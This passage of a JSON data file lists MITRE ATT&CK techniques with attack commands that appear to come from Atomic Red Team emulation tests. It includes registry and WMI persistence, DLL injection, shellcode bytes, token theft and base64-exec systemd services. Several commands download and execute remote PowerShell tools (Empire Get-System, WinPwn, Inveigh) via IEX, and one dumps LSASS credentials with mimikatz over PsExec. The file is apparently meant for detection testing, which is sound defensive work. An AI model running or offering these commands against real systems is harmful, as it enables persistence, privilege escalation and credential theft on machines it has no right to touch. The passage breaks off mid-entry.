            "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force"
         }
      ]
   },
   "T1547.006": {
      "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test uses the insmod command to load a kernel module for Linux.\n",
            "command": "sudo insmod /tmp/T1547.006/T1547006.ko"
         },
         {
            "description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n",
            "command": "set -x; sudo kextload /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext; sudo kmutil load -p /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kmutil unload -p /Library/Extensions/SoftRAID.kext"
         },
         {
            "description": "The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named \u201ccomadmin.dat\u201d and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
            "command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)"
         },
         {
            "description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n",
            "command": "sudo /tmp/T1547006_iokit_loader; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext"
         }
      ]
   },
   "T1574.002": {
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
            "command": "set DOTNET_STARTUP_HOOKS=\"80410d_preloader.dll\" && dotnet -h > nul && echo."
         },
         {
            "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n",
            "command": "\"67baa5_GUP.exe\""
         }
      ]
   },
   "T1546.007": {
      "technique_name": "Event Triggered Execution: Netsh Helper DLL",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n",
            "command": "netsh.exe add helper \"08497f_NetshHelper.dll\" && taskkill /im notepad.exe /t /f > NUL 2>&1"
         }
      ]
   },
   "T1134.001": {
      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
            "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; Start-Process .\\BadPotato.exe notepad.exe; Start-Sleep -Second 20; Stop-Process -Name \"notepad\" -force -erroraction silentlycontinue; Stop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue"
         },
         {
            "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose"
         },
         {
            "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
            "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\NSudoLG.exe\" -Argument \"-U:T -P:E cmd\"; Start-Sleep -Second 5; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue"
         },
         {
            "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose"
         }
      ]
   },
   "T1547.014": {
      "technique_name": "Active Setup",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
            "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
         },
         {
            "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
            "command": "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
         },
         {
            "description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
            "command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force ; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
         }
      ]
   },
   "T1547.009": {
      "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
            "command": "$Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save(); $Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save()"
         },
         {
            "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n",
            "command": "echo [InternetShortcut] > %temp%\\T1547.009_modified_shortcut.url && echo URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1547.009_modified_shortcut.url && %temp%\\T1547.009_modified_shortcut.url"
         }
      ]
   },
   "T1546.011": {
      "technique_name": "Event Triggered Execution: Application Shimming",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
            "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"; New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\""
         },
         {
            "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n",
            "command": "sdbinst.exe \"729b9b_AtomicShimx86.sdb\""
         },
         {
            "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb"
         }
      ]
   },
   "T1055.001": {
      "technique_name": "Process Injection: Dynamic-link Library Injection",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')"
         },
         {
            "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
            "command": "$mypid =; mavinject $mypid /INJECTRUNNING \"#{dll_payload}\"; Stop-Process -processname notepad"
         },
         {
            "description": "Leverage odbcconf for DLL injection",
            "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"
         }
      ]
   },
   "T1547.003": {
      "technique_name": "Time Providers",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
            "command": "net stop w32time; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1547_003_AtomicTest.dll\" C:\\Users\\Public\\T1547_003_AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\T1547_003_AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time"
         },
         {
            "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
            "command": "net stop w32time; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1547_003_AtomicTest.dll\" C:\\Users\\Public\\T1547_003_AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\T1547_003_AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time"
         }
      ]
   },
   "T1547.010": {
      "technique_name": "Boot or Logon Autostart Execution: Port Monitors",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
            "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"dba276_PortMonitor.dll\" /t REG_SZ /f"
         }
      ]
   },
   "T1546": {
      "technique_name": "Event Triggered Execution",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
            "command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\""
         },
         {
            "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n",
            "command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\"};  ;  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll"
         },
         {
            "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n",
            "command": " $RemoteComputer = \"localhost\";  $PWord = ConvertTo-SecureString -String \"P@ssword1\" -AsPlainText -Force;  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"Administrator\", $Pword;  $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential;  $ProcessToStart = \"calc.exe\";  $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart};  if ($Result.ReturnValue -eq 0) {;      Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\";  } else {;      Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\";  };  Remove-CimSession -CimSession $CimSession"
         },
         {
            "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
            "command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"; if (!(Test-Path -path $path)){;   New-Item -ItemType Key -Path $path; }; New-ItemProperty -Path $path -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\""
         }
      ]
   },
   "T1546.003": {
      "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
            "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs"
         },
         {
            "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
            "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 ScriptingEngine='VBScript';                 ScriptText=';                 Set objws = CreateObject(\"Wscript.Shell\");                 objws.Run \"notepad.exe\", 0, True;                 '}; $Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = $Filter; Consumer = $Consumer; }; $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs"
         },
         {
            "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
            "command": "c:\\windows\\system32\\wbem\\mofcomp.exe \"715d8f_T1546.003.mof\""
         }
      ]
   },
   "T1055": {
      "technique_name": "Process Injection",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" /accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\""
         },
         {
            "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"40c65d_T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\""
         },
         {
            "description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
            "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\redVanity.exe\" (Start-Process calc.exe -PassThru).Id"
         },
         {
            "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
            "command": "$notepad = Start-Process notepad -passthru; Start-Process \"C:\\Users\\puma-4\\Desktop\\InjectView.exe\""
         },
         {
            "description": "Start a new calculator process",
            "command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"
         }
      ]
   },
   "T1543.002": {
      "technique_name": "Create or Modify System Process: Systemd Service",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n",
            "command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then : ; else echo Please run from Ubuntu ,Kali OR CentOS.; fi;  ;  cat > /etc/init.d/T1543.002 << EOF; python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"; EOF; chmod +x /etc/init.d/T1543.002; if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ; systemctl enable T1543.002; systemctl start T1543.002; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002; systemctl daemon-reload; systemctl restart T1543.002"
         },
         {
            "description": "This test creates a Systemd service unit file and enables it as a service.\n",
            "command": "echo \"[Unit]\" > /etc/systemd/system/art-systemd-service.service; echo \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Service]\" >> /etc/systemd/system/art-systemd-service.service; echo \"Type=simple\"; echo \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Install]\" >> /etc/systemd/system/art-systemd-service.service; echo \"WantedBy=default.target\" >> /etc/systemd/system/art-systemd-service.service; systemctl daemon-reload; systemctl enable art-systemd-service.service; systemctl start art-systemd-service.service"
         }
      ]
   },
   "T1557.001": {
      "technique_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y"
         }
      ]
   },
   "T1484.002": {
      "technique_name": "Domain Trust Modification",
      "tactic": "multiple",
      "known implementations": [
         {
